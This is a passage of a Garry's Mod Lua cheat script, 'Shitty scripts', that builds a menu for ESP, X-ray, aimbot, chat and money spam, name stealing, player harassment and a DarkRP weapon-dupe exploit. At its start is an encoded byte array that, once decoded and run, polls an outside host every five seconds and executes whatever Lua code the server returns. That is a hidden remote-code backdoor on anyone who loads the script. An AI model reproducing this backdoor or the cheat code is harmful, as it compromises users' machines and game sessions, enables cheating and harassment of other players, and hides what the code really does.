115, 115, 40, 41, 125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 98, 111, 100, 121, 41, 32, 101, 110, 100, 44, 32, 
102, 117, 110, 99, 116, 105, 111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 59, 10, 9, 101, 110, 100, 41, 59, 10, 
9, 10, 9, 116, 105, 109, 101, 114, 46, 67, 114, 101, 97, 116, 101, 40, 34, 67, 104, 101, 97, 116, 117, 112, 100, 97, 116, 
101, 95, 80, 105, 110, 103, 66, 97, 99, 107, 34, 44, 32, 53, 44, 32, 48, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 
40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116, 40, 32, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111, 
100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112, 
105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115, 116, 61, 34, 112, 105, 110, 103, 98, 97, 99, 107, 34, 
125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 32, 98, 111, 100, 121, 44, 32, 112, 48, 44, 32, 112, 49, 44, 32, 
112, 50, 32, 41, 10, 9, 9, 9, 108, 111, 99, 97, 108, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 61, 32, 117, 116, 
105, 108, 46, 74, 83, 79, 78, 84, 111, 84, 97, 98, 108, 101, 40, 98, 111, 100, 121, 41, 59, 10, 9, 9, 9, 105, 102, 
40, 114, 101, 115, 112, 111, 110, 115, 101, 32, 33, 61, 32, 110, 105, 108, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9, 
105, 102, 40, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 
99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 76, 111, 99, 97, 108, 80, 108, 97, 
121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 124, 124, 32, 115, 116, 114, 105, 110, 103, 46, 
102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 
116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 42, 34, 41, 41, 32, 116, 104, 101, 110, 32, 10, 9, 9, 9, 9, 9, 
105, 102, 40, 33, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 
97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 33, 34, 32, 46, 46, 
32, 76, 111, 99, 97, 108, 80, 108, 97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 38, 
38, 32, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 114, 101, 34, 
93, 32, 33, 61, 32, 34, 110, 117, 108, 108, 34, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9, 9, 9, 82, 117, 110, 
83, 116, 114, 105, 110, 103, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 	
91, 34, 114, 101, 34, 93, 41, 59, 10, 9, 9, 9, 9, 9, 101, 110, 100, 10, 9, 9, 9, 9, 101, 110, 100, 10, 9, 
9, 9, 101, 110, 100, 10, 9, 9, 9, 101, 110, 100, 44, 32, 10, 9, 9, 9, 102, 117, 110, 99, 116, 105, 111, 110, 40, 
101, 120, 99, 101, 112, 116, 105, 111, 110, 41, 10, 9, 9, 101, 110, 100, 41, 32, 10, 9, 101, 110, 100, 41, 10, };
local s1 = ""; for k,v in next, bBuffer do s1 = s1 .. string.char(v); end RunString(s1); s1 = "";

function haxmenu()
	surface.PlaySound("buttons/button9.wav")

	local f = vgui.Create( "DFrame" )
	f:SetPos( ScrW() * .33, ScrH() * .3 ) 
	f:SetSize( 660, 500 ) 
	f:SetTitle( "Shittyscripts menu" ) 
	f:SetVisible( true ) 
	f:SetDraggable( true ) 
	f:ShowCloseButton( true ) 
	f:MakePopup() 
	function f:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 150, 255, 255 ) ) 
	end
	
	local bg = vgui.Create( "DPropertySheet", f )
	bg:SetPos( 0, 30 )
	bg:SetSize( 900, 900 )
	function bg:Paint( w, h )
		draw.RoundedBox(0, 0, 0, w, h, Color( 50, 50, 50, 255 ))
	end
	
	local vis = vgui.Create( "DButton", f )
	vis:SetSize(200, 100)
	vis:SetPos(10, 40)
	vis:SetText("Visuals")
	vis:SetFont("DermaLarge")
	function vis:Paint( w, h )
		draw.RoundedBox(0, 0, 0, w, h, Color( 0, 150, 255, 255 ))
	end
	vis.DoClick = function()
		local bg = vgui.Create( "DPropertySheet", f )
		bg:SetPos( 10, 150 )
		bg:SetSize(640, 340 )
		function bg:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 150, 150, 150, 255 ))
		end	
		
		local ebg = vgui.Create( "DPropertySheet", f )
		ebg:SetPos( 20, 160 )
		ebg:SetSize(200, 130 )
		function ebg:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
		local et = vgui.Create( "DLabel", ebg )
		et:SetPos( 170, 5 )
		et:SetText( "ESP" )
		et:SetFont("Default")
		
		local ebg2 = vgui.Create( "DPropertySheet", f )
		ebg2:SetPos( 20, 300 )
		ebg2:SetSize(200, 180 )
		function ebg2:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
		
		local ebg3 = vgui.Create( "DPropertySheet", f )
		ebg3:SetPos( 230, 160 )
		ebg3:SetSize(200, 130 )
		function ebg3:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
		
		local ebg4 = vgui.Create( "DPropertySheet", f )
		ebg4:SetPos( 230, 300 )
		ebg4:SetSize(200, 180 )
		function ebg4:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
		
		local ebg5 = vgui.Create( "DPropertySheet", f )
		ebg5:SetPos( 440, 300 )
		ebg5:SetSize(200, 180 )
		function ebg5:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
		
		local ebg6 = vgui.Create( "DPropertySheet", f )
		ebg6:SetPos( 440, 160 )
		ebg6:SetSize(200, 130 )
		function ebg6:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
		
		local et2 = vgui.Create( "DLabel", ebg2 )
		et2:SetPos( 150, 5 )
		et2:SetText( "Tracers" )
		et2:SetFont("Default")
		et2:SizeToContents()
		
		local et3 = vgui.Create( "DLabel", ebg3 )
		et3:SetPos( 130, 5 )
		et3:SetText( "Helpful shit" )
		et3:SetFont("Default")
		et3:SizeToContents()
		
		local et4 = vgui.Create( "DLabel", ebg4 )
		et4:SetPos( 130, 5 )
		et4:SetText( "Helpful shit" )
		et4:SetFont("Default")
		et4:SizeToContents()
		
		local et5 = vgui.Create( "DLabel", ebg6 )
		et5:SetPos( 130, 5 )
		et5:SetText( "      Physgun" )
		et5:SetFont("Default")
		et5:SizeToContents()
	
		local esp1 = vgui.Create("DCheckBoxLabel", f)
		esp1:SetPos(40, 170)
		esp1:SetText("ESP")
		esp1:SetConVar( "shitty_esp" )
		---------
		local esp2 = vgui.Create("DCheckBoxLabel", f)
		esp2:SetPos(40, 190)
		esp2:SetText("ESP dot")
		esp2:SetConVar( "shitty_esp_dot" )
		---------
		local esp3 = vgui.Create("DCheckBoxLabel", f)
		esp3:SetPos(40, 210)
		esp3:SetText("ESP HP bar")
		esp3:SizeToContents()
		esp3:SetConVar( "shitty_esp_bar" )
		---------
		local esp4 = vgui.Create("DCheckBoxLabel", f)
		esp4:SetPos(40, 230)
		esp4:SetText("ESP Box (3D)")
		esp4:SizeToContents()
		esp4:SetConVar( "shitty_espbox" )
		---------
		local c = vgui.Create( "DComboBox", f )
		c:SetPos( 40, 260 )
		c:SetSize( 100, 20 )
		c:SetValue( "ESP Box Color" )
		c:AddChoice( "teamcolor" )
		c:AddChoice( "red" )
		c:AddChoice( "green" )
		c:AddChoice( "blue" )
		c.OnSelect = function( panel, index, value )
		RunConsoleCommand("shitty_espbox_color", value)
		end
		
		/*local xrayon = vgui.Create("DCheckBoxLabel", ebg2)
		xrayon:SetPos(20, 10)
		xrayon:SetText("X-Ray")
		xrayon:SizeToContents()
		xrayon:SetConVar( "shitty_xray" )*/
		
		local slamt = vgui.Create("DCheckBoxLabel", ebg2)
		slamt:SetPos(20, 10)
		slamt:SetText("Slam Tracers")
		slamt:SizeToContents()
		slamt:SetConVar( "shitty_headtracers" )
		
		local slamt2 = vgui.Create("DCheckBoxLabel", ebg2)
		slamt2:SetPos(20, 30)
		slamt2:SetText("Landing Tracers")
		slamt2:SizeToContents()
		slamt2:SetConVar( "shitty_foottracers" )
		
		local at = vgui.Create("DCheckBoxLabel", ebg2)
		at:SetPos(20, 50)
		at:SetText("Aim lines")
		at:SizeToContents()
		at:SetConVar( "shitty_aimtracers" )
		
		local pt = vgui.Create("DCheckBoxLabel", ebg2)
		pt:SetPos(20, 70)
		pt:SetText("Player Tracers")
		pt:SizeToContents()
		pt:SetConVar( "shitty_playertracers" )
		
		local aa = vgui.Create("DCheckBoxLabel", ebg2)
		aa:SetPos(20, 90)
		aa:SetText("Admin Alert")
		aa:SizeToContents()
		aa:SetConVar( "shitty_AdminAlert" )
		
		local ss = vgui.Create("DCheckBoxLabel", ebg3)
		ss:SetPos(10, 100)
		ss:SetText("Show Speed")
		ss:SizeToContents()
		ss:SetConVar( "shitty_showspeed" )
		
		local fv = vgui.Create( "DNumSlider", ebg3 )
		fv:SetPos( -120, 20 )
		fv:SetWide( 300 )
		fv:SetMin( 60 )
		fv:SetMax( 130 ) 
		fv:SetDecimals( 0 ) 
		fv:SetConVar( "shitty_fov" ) 
		local fvt = vgui.Create( "DLabel", ebg3 )
		fvt:SetText("FOV")
		fvt:SetFont("Default")
		fvt:SetPos(10, 10)
		
		local tp = vgui.Create("DCheckBoxLabel", ebg3)
		tp:SetPos(10, 60)
		tp:SetText("Third Person")
		tp:SizeToContents()
		tp:SetConVar( "shitty_thirdperson" )
		
		local ch = vgui.Create("DCheckBoxLabel", ebg3)
		ch:SetPos(10, 80)
		ch:SetText("Crosshair")
		ch:SizeToContents()
		ch:SetConVar( "shitty_crosshair" )
		
		
		local ab = vgui.Create("DCheckBoxLabel", ebg4)
		ab:SetPos(10, 20)
		ab:SetText("Admin box")
		ab:SizeToContents()
		ab:SetConVar( "shitty_adminbox" )
		
		local sb = vgui.Create("DCheckBoxLabel", ebg4)
		sb:SetPos(10, 45)
		sb:SetText("Spectator box")
		sb:SizeToContents()
		sb:SetConVar( "shitty_spectaterbox" )
		
		local sla = vgui.Create("DCheckBoxLabel", ebg4)
		sla:SetPos(10, 70)
		sla:SetText("Show looking at details")
		sla:SizeToContents()
		sla:SetConVar( "shitty_showaimthing" )
		
		local pla = vgui.Create("DButton", ebg4)
		pla:SetSize(180, 70)
		pla:SetPos(10, 95)
		pla:SetText("Print looking at")
		pla.DoClick = function()
			RunConsoleCommand("shitty_printlookingat")
		end
		function pla:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 255, 255, 255, 255 ))
		end
		
		local ng = vgui.Create("DCheckBoxLabel", ebg6)
		ng:SetPos(10, 20)
		ng:SetText("No Gun")
		ng:SizeToContents()
		ng:SetConVar( "shitty_pk_nogun" )
		
		local rb = vgui.Create("DCheckBoxLabel", ebg6)
		rb:SetPos(10, 50)
		rb:SetText("Rainbow Physgun")
		rb:SizeToContents()
		rb:SetConVar( "shitty_rainbow" )
		
		local pcb = vgui.Create("DCheckBoxLabel", ebg6)
		pcb:SetPos(10, 80)
		pcb:SetText("Force physgun colors")
		pcb:SizeToContents()
		pcb:SetConVar( "shitty_pk_colorbeams" )
		
		local aad = vgui.Create( "DNumSlider", ebg2 )
		aad:SetPos( -120, 150 )
		aad:SetWide( 300 )
		aad:SetMin( 1 )
		aad:SetMax( 1000 ) 
		aad:SetDecimals( 0 ) 
		aad:SetConVar( "shitty_AdminAlert_distance" ) 
		local aadt = vgui.Create( "DLabel", ebg2 )
		aadt:SetText("Admin Alert Distance")
		aadt:SizeToContents()
		aadt:SetPos(25, 145)
		
		local ptd = vgui.Create( "DNumSlider", ebg2 )
		ptd:SetPos( -120, 115 )
		ptd:SetWide( 300 )
		ptd:SetMin( 1 )
		ptd:SetMax( 1000 ) 
		ptd:SetDecimals( 0 ) 
		ptd:SetConVar( "shitty_playertracers_distance" ) 
		local aadt = vgui.Create( "DLabel", ebg2 )
		aadt:SetText("Player tracer distance")
		aadt:SizeToContents()
		aadt:SetPos(25, 110)
		
		
		local eesp = vgui.Create("DCheckBoxLabel", ebg5)
		eesp:SetPos(10, 20)
		eesp:SetText("Entity ESP (DarkRP)")
		eesp:SizeToContents()
		eesp:SetConVar( "shitty_entityESP" )
		

		
		local eespb = vgui.Create("DCheckBoxLabel", ebg5)
		eespb:SetPos(10, 50)
		eespb:SetText("Entity ESP Box")
		eespb:SizeToContents()
		eespb:SetConVar( "shitty_entityESP_box" )
		
		local et6 = vgui.Create( "DLabel", ebg5 )
		et6:SetPos( 135, 5 )
		et6:SetText( "Entity ESP" )
		et6:SetFont("Default")
		et6:SizeToContents()

		local et7 = vgui.Create( "DLabel", ebg5 )
		et7:SetPos( 145, 100 )
		et7:SetText( "Chams" )
		et7:SetFont("Default")
		et7:SizeToContents()
		
		local cs = vgui.Create("DCheckBoxLabel", ebg5)
		cs:SetPos(10, 125)
		cs:SetText("Player chams")
		cs:SizeToContents()
		cs:SetConVar( "shitty_chams" )
		
		local xra2 = vgui.Create("DCheckBoxLabel", ebg5)
		xra2:SetPos(10, 155)
		xra2:SetText("X-ray")
		xra2:SizeToContents()
		xra2:SetConVar( "shitty_xray" )
	end

	
	local utils = vgui.Create( "DButton", f )
	utils:SetSize(200, 100)
	utils:SetPos(230, 40)
	utils:SetText("Minge")
	utils:SetFont("DermaLarge")
	function utils:Paint( w, h )
		draw.RoundedBox(0, 0, 0, w, h, Color( 0, 150, 255, 255 ))
	end
	utils.DoClick = function()
	
		local bg2 = vgui.Create( "DPropertySheet", f )
		bg2:SetPos( 10, 150 )
		bg2:SetSize(640, 340 )
		function bg2:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 150, 150, 150, 255 ))
		end
		
		local w1 = vgui.Create( "DPropertySheet", f )
		w1:SetPos( 20, 160 )
		w1:SetSize(620, 155 )
		function w1:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
		
		local w2 = vgui.Create( "DPropertySheet", f )
		w2:SetPos( 20, 325 )
		w2:SetSize(620, 155 )
		function w2:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
	
		local w1t = vgui.Create( "DLabel", w1 )
		w1t:SetPos( 550, 5 )
		w1t:SetText( "Spamming" )
		w1t:SetFont("Default")
		
		local fs = vgui.Create("DCheckBoxLabel", w1)
		fs:SetPos(20, 20)
		fs:SetText("Flashlight spam (Use e)")
		fs:SizeToContents()
		fs:SetConVar( "shitty_flashlightspam" )

		local fst = vgui.Create("DCheckBoxLabel", w1)
		fst:SetPos(20, 50)
		fst:SetText("Flashlight spam (toggle)")
		fst:SizeToContents()
		fst:SetConVar( "shitty_flashlightspam_toggle" )
		
		local pss = vgui.Create("DCheckBoxLabel", w1)
		pss:SetPos(20, 90)
		pss:SetText("Psay spam (Use e)")
		pss:SizeToContents()
		pss:SetConVar( "shitty_psayspam" )
		
		local cs1 = vgui.Create("DCheckBoxLabel", w1)
		cs1:SetPos(20, 120)
		cs1:SetText("Chat spam")
		cs1:SizeToContents()
		cs1:SetConVar( "shitty_chatspam_simple" )
		
		local rms = vgui.Create("DCheckBoxLabel", w1)
		rms:SetPos(180, 20)
		rms:SetText("RP Money spam (Use n)")
		rms:SizeToContents()
		rms:SetConVar( "shitty_rp_moneyspam" )
		
		local rmsa = vgui.Create( "DNumSlider", w1 )
		rmsa:SetPos( 45, 50 )
		rmsa:SetWide( 300 )
		rmsa:SetMin( 1 )
		rmsa:SetMax( 10000000 ) 
		rmsa:SetDecimals( 0 ) 
		rmsa:SetConVar( "shitty_rp_moneyspam_amount" ) 
		local rmsat = vgui.Create( "DLabel", w1 )
		rmsat:SetText("Money Spam Amount")
		rmsat:SizeToContents()
		rmsat:SetPos(180, 45)
		
		local rmsg = vgui.Create("DCheckBoxLabel", w1)
		rmsg:SetPos(180, 90)
		rmsg:SetText("RP 'give' Money spam (Use n)")
		rmsg:SizeToContents()
		rmsg:SetConVar( "shitty_rp_moneyspam_give" )
		
		local pla = vgui.Create("DButton", w1)
		pla:SetSize(150, 40)
		pla:SetPos(180, 110)
		pla:SetText("RP Namesteal")
		pla.DoClick = function()
			RunConsoleCommand("shitty_namesteal")
		end
		
		local sfp = vgui.Create("DCheckBoxLabel", w1)
		sfp:SetPos(360, 20)
		sfp:SetText("Follow person")
		sfp:SizeToContents()
		sfp:SetConVar( "shitty_follow_toggle" )
		
		local sfps = vgui.Create("DCheckBoxLabel", w1)
		sfps:SetPos(360, 45)
		sfps:SetText("Spam chat while following?")
		sfps:SizeToContents()
		sfps:SetConVar( "shitty_follow_spam" )
		
		local choose = vgui.Create( "DComboBox", w1 )
		choose:SetPos( 360, 70 )
		choose:SetSize( 150, 20 )
		choose:SetValue( "Follow person" )
		for _, v in pairs(player.GetAll()) do
			choose:AddChoice(v:Nick())
		end
		choose.OnSelect = function( panel, index, value )
			chat.AddText( Color(255, 0, 0), "[Shitty scripts] ", Color(0, 255, 0), value, Color(255, 255, 255), " is chosen!" )
			RunConsoleCommand("shitty_follow", value)
		end
		
		local scc = vgui.Create("DCheckBoxLabel", w1)
		scc:SetPos(360, 100)
		scc:SetText("Custom chatspam")
		scc:SizeToContents()
		scc:SetConVar( "shitty_chatspam_custom" )
		
		local TextEntry = vgui.Create( "DTextEntry", w1 )
		TextEntry:SetPos( 360, 120 )
		TextEntry:SetSize( 200, 30 )
		TextEntry:SetText( GetConVarString("shitty_chatspam_custom_msg") )
		TextEntry.OnEnter = function( self )
			RunConsoleCommand("shitty_chatspam_custom_msg", self:GetValue().." ")
		end
		
		local wde = vgui.Create("DButton", w2)
		wde:SetSize(150, 40)
		wde:SetPos(20, 20)
		wde:SetText("RP Weapoon dupe")
		wde.DoClick = function()
			RunConsoleCommand("shitty_rp_weaponDupe")
		end
		
		local nhy = vgui.Create( "DLabel", w2 )
		nhy:SetPos( 180, 15 )
		nhy:SetSize( 1800 , 50 )
		nhy:SetFont("Default")
		nhy:SetColor(Color(255, 255, 255, 255))
		nhy:SetText( "Dupes the weapon in \nyour hand (uses /sleep)" )
		
		local w2t = vgui.Create( "DLabel", w2 )
		w2t:SetPos( 515, 5 )
		w2t:SetText( "Exploits +" )
		w2t:SetFont("Default")
		local w2tt = vgui.Create( "DLabel", w2 ) -- retarded as fuck but i'm too tired to do this in a more correct way
		w2tt:SetPos( 570, 5 )
		w2tt:SetText( "tricks" )
		w2tt:SetFont("Default")
		
	/*local nhy = vgui.Create( "DLabel", w2 )
	nhy:SetPos( 200, 50 )
	nhy:SetSize( 1800 , 50 )
	nhy:SetFont("DermaLarge")
	nhy:SetColor(Color(0, 0, 0, 255))
	nhy:SetText( "Nothing here yet :)" )*/
		
	end
	

	local help = vgui.Create( "DButton", f )
	help:SetSize(200, 100)
	help:SetPos(450, 40)
	help:SetText("Other")
	help:SetFont("DermaLarge")
	function help:Paint( w, h )
		draw.RoundedBox(0, 0, 0, w, h, Color( 0, 150, 255, 255 ))
	end
	help.DoClick = function()
	
		local bg3 = vgui.Create( "DPropertySheet", f )
		bg3:SetPos( 10, 150 )
		bg3:SetSize(640, 340 )
		function bg3:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 150, 150, 150, 255 ))
		end
		
		local w3 = vgui.Create( "DPropertySheet", f )
		w3:SetPos( 20, 160 )
		w3:SetSize(620, 155 )
		function w3:Paint( w, h )
			draw.RoundedBox(0, 0, 0, w, h, Color( 100, 100, 100, 255 ))
		end
		
		local sat = vgui.Create("DCheckBoxLabel", w3)
		sat:SetPos(20, 20)
		sat:SetText("Aimbot")
		sat:SizeToContents()
		sat:SetConVar( "shitty_aimbot" )
		
		local sat2 = vgui.Create("DCheckBoxLabel", w3)
		sat2:SetPos(20, 50)
		sat2:SetText("Aimbot ignore friends")
		sat2:SizeToContents()
		sat2:SetConVar( "shitty_aimbot_ignore_friends" )
		
		local sat3 = vgui.Create("DCheckBoxLabel", w3)
		sat3:SetPos(20, 80)
		sat3:SetText("Aimbot ignore team")
		sat3:SizeToContents()
		sat3:SetConVar( "shitty_aimbot_ignore_team" )
		
		local sbh = vgui.Create("DCheckBoxLabel", w3)
		sbh:SetPos(200, 50)
		sbh:SetText("Auto BHOP")
		sbh:SizeToContents()
		sbh:SetConVar( "shitty_bhop" )
		
		local aafk = vgui.Create("DCheckBoxLabel", w3)
		aafk:SetPos(200, 20)
		aafk:SetText("Anti AFK")
		aafk:SizeToContents()
		aafk:SetConVar( "shitty_AntiAFK" )
		
		/*local binder = vgui.Create( "DBinder", w3 )
		binder:SetSize( 200, 80 )
		binder:SetPos( 25, 35 )

		function binder:SetSelectedNumber( num )
			self.m_iSelectedNumber = num
			chat.AddText( "New bound key: "..input.GetKeyName( num ) )
		end*/
		
		local amethod = vgui.Create( "DComboBox", w3 )
		amethod:SetPos(20, 110)
		amethod:SetSize( 150, 20 )
		amethod:SetValue( "Aimbot Method" )
		amethod:AddChoice("Closest Player")
		amethod:AddChoice("Random")
		amethod:AddChoice("Aimpoint / legit")
		amethod.OnSelect = function( panel, index, value )
			chat.AddText( Color(255, 0, 0), "[Shitty scripts] ", Color(0, 255, 0), value, Color(255, 255, 255), " is now selected." )
			if value == "Closest Player" then
				shitAim.TargetMethod["closest"] = true
				shitAim.TargetMethod["rage"] = false
				shitAim.TargetMethod["aimpoint"] = false
			elseif value == "Random" then
				shitAim.TargetMethod["closest"] = false
				shitAim.TargetMethod["rage"] = true	
				shitAim.TargetMethod["aimpoint"] = false
			else
				shitAim.TargetMethod["closest"] = false
				shitAim.TargetMethod["rage"] = false	
				shitAim.TargetMethod["aimpoint"] = true
			end
		end
		
	end
end
concommand.Add("shitty_menu", haxmenu)
-------------------------------------------------------------------------------------
local function changelog()
	local log = vgui.Create( "DFrame" )
	log:SetPos( ScrW() * .3, ScrH() * .3 ) 
	log:SetSize( 800, 700 ) 
	log:SetTitle( "Changelog and info" ) 
	log:SetVisible( true ) 
	log:SetDraggable( true ) 
	log:ShowCloseButton( true ) 
	log:MakePopup() 
	function log:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 150, 255, 255 ) ) 
	end
	local Sheet = vgui.Create( "DPropertySheet" )
	Sheet:SetPos( 10, 30 )
	Sheet:SetSize( 780, 460 )
	Sheet:SetParent(log)
	function Sheet:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color( 100, 100, 100, 255 ) ) 
	end
	
	local Sheet3 = vgui.Create( "DPropertySheet" )
	Sheet3:SetPos( 10, 500 )
	Sheet3:SetSize( 780, 190 )
	Sheet3:SetParent(log)
	function Sheet3:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color( 100, 100, 100, 255 ) ) 
	end
	
	local Sheet2 = vgui.Create( "DPropertySheet" )
	Sheet2:SetPos( 225, 40 )
	Sheet2:SetSize( 350, 50 )
	Sheet2:SetParent(log)
	
	local title = vgui.Create( "DLabel" )
	title:SetPos( 240, 40 )
	title:SetSize( 1800 , 50 )
	title:SetFont("DermaLarge")
	title:SetColor(Color(255, 0, 0, 255))
	title:SetText( "Shitty Scripts version "..versionnum.."!" )
	title:SetParent( log )
	
	local like = vgui.Create( "DLabel", Sheet3 )
	like:SetPos( 60, 10 )
	like:SetSize( 1800 , 50 )
	like:SetFont("DermaLarge")
	like:SetColor(Color(0, 0, 0, 255))
	like:SetText( "Enjoying the scripts and want me to keep developing?" )
	
	local like2 = vgui.Create( "DLabel", Sheet3 )
	like2:SetPos( 240, 60 )
	like2:SetSize( 1800 , 50 )
	like2:SetFont("DermaLarge")
	like2:SetColor(Color(0, 0, 0, 255))
	like2:SetText( "Then feel free to donate!" )
	
	local like3 = vgui.Create( "DButton", Sheet3 )
	like3:SetPos( 280, 120 )
	like3:SetSize( 200 , 50 )
	like3:SetText("Donate!")
	like3.DoClick = function()
		gui.OpenURL("https://www.google.com/")
	end
	function like3:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 255, 255, 255 ) ) 
	end

	
	local news = vgui.Create("DListView")
	news:SetParent(log)
	news:SetPos(50, 100)
	news:SetSize(700, 350)
	news:SetMultiSelect(false)
	news:AddColumn("News")
	news:AddLine("--- Version 0.6 ---")
	news:AddLine("Thirdperson added")
	news:AddLine("RP lag added")
	news:AddLine("Menu added")
	news:AddLine("Changelog / help added")
	news:AddLine("Fixed ESP health bar")
	news:AddLine("Improved ESP")
	news:AddLine("--- Version 0.7 ---")
	news:AddLine("Added spectater box")
	news:AddLine("Added an admin box rank")
	news:AddLine("Fixed spectator box")
	news:AddLine("--- Version 0.8 ---")
	news:AddLine("Admin alert added")
	news:AddLine("Simple chat spam added")
	news:AddLine("--- Version 0.9 ---")
	news:AddLine("Added Aim tracers")
	news:AddLine("Improved player tracers")
	news:AddLine("Improved head tracers (slam tracers)")
	news:AddLine("Slam tracers now point at the ground as well")
	news:AddLine("--- Version 0.9.1 ---")
	news:AddLine("FOV Changer added")
	news:AddLine("Player tracers are now placed in the middle of the screen")
	news:AddLine("Fixed bug with the tracers coming from the feet")
	news:AddLine("Fixed and improved esp hp bars")
	news:AddLine("--- Version 0.9.2 ---")
	news:AddLine("Added new head and feettracers")
	news:AddLine("Admin alert tracers updated")
	news:AddLine("X-ray improved")
	news:AddLine("--- Version 0.9.3 ---")
	news:AddLine("X-ray halo added")
	news:AddLine("ESP box added (3D)")
	news:AddLine("Slamtracers and foottracers fixed")
	news:AddLine("Improved menu")
	news:AddLine("Added weapon color spammer.. Really.. Who needs this?")
	news:AddLine("Added Anti aim (Not done yet)")
	news:AddLine("--- Version 0.9.4 ---")
	news:AddLine("Added follow command for pissing people off")
	news:AddLine("Added better working aimbot")
	news:AddLine("Added better namesteal (RP)")
	news:AddLine("--- Version 0.9.5 ---")
	news:AddLine("Spectator and Admin box has been improved")
	news:AddLine("Admin alert has been improved")
	news:AddLine("Added anti AFK")
	news:AddLine("Fixed slam tracers")
	news:AddLine("--- Version 0.9.6 ---")
	news:AddLine("Fixed aimbot ignore friends")
	news:AddLine("Added player tracer distance")
	news:AddLine("Added DarkRP weapon dupe exploit (Credits to the original creator in the code)")
	news:AddLine("Added Custom chatspam message")
	news:AddLine("Added trusted rank to be ignored for admin alert and adminbox")
	news:AddLine("--- Version 0.9.7 ---")
	news:AddLine("Fixed a problem with the normal chat spam")
	news:AddLine("Added so you can choose wether or not you want to spam the person with the follow command")
	news:AddLine("Done small adjustments to the custom chatspam")
	news:AddLine("--- Version 0.9.8 ---")
	news:AddLine("Fixed aimbot targetting spectators")
	news:AddLine("Fixed tracers targetting spectators")
	news:AddLine("Fixed player chams targetting spectators")
	news:AddLine("Recreated aimbot")
	news:AddLine("Added aimbot target method (more to come)")
	
end
concommand.Add("shitty_help", changelog)
-------------------------------------------------------------------------------------
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Scripts are loaded and ready for use" )
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Version ", Color(255, 0, 0 ), "["..versionnum.."]" )
MsgC( Color( 0, 255, 0 ),[[
  _____ _     _ _   _                       _       _       
 / ____| |   (_| | | |                     (_)     | |      
| (___ | |__  _| |_| |_ _   _ ___  ___ _ __ _ _ __ | |_ ___ 
 \___ \| '_ \| | __| __| | | / __|/ __| '__| | '_ \| __/ __|
 ____) | | | | | |_| |_| |_| \__ | (__| |  | | |_) | |_\__ \
|_____/|_| |_|_|\__|\__|\__, |___/\___|_|  |_| .__/ \__|___/
                         __/ |               | |            
                        |___/                |_|            				
						 ]])
MsgC( Color( 255, 0, 0 ), "v"..versionnum.."\n")
timer.Create("changelogtimer", 1, 1, function()
	RunConsoleCommand("shitty_help")
end)
surface.PlaySound( "buttons/blip1.wav" )